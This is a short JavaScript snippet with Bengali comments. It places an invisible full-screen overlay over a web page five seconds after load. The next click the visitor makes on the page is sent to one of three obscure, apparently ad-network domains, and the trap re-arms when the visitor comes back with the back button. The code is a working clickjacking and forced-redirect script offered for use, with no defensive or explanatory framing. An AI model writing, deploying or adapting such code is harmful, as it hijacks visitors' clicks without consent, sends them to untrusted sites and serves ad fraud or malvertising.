// তিনটি URL
const redirectLinks = [
  "https://nickeldefiancepriest.com/pynxydkcf?key=9fcaaab1932732baaffa3314295d33af",
  "https://pairturnnumerous.com/rze4wd8aa?key=74d74ecf1cacbe96436ceb718716741c",
  "https://villagetraitgarret.com/fz3ifw9n?key=255cb9b54aebe1dca0f89408b47e3fcf"
];

let currentIndex = 0; // কোন URL-এ যাবে ট্র্যাকের জন্য
const popup = document.createElement("div");

// Overlay CSS
popup.id = "popupOverlay";
popup.style.position = "fixed";
popup.style.top = "0";
popup.style.left = "0";
popup.style.width = "100%";
popup.style.height = "100%";
popup.style.background = "rgba(0,0,0,0.0)";
popup.style.display = "none";
popup.style.zIndex = "9999";
popup.style.cursor = "pointer";

document.body.appendChild(popup);

// Function to show popup after 5s
function showPopup() {
  setTimeout(() => {
    popup.style.display = "block";
  }, 5000);
}

showPopup();

popup.addEventListener("click", function() {
  const nextLink = redirectLinks[currentIndex];
  currentIndex = (currentIndex + 1) % redirectLinks.length;
  popup.style.display = "none";
  window.location.href = nextLink;
});

// Back button
window.addEventListener("pageshow", function(event) {
  if (event.persisted) {
    showPopup();
  }
});
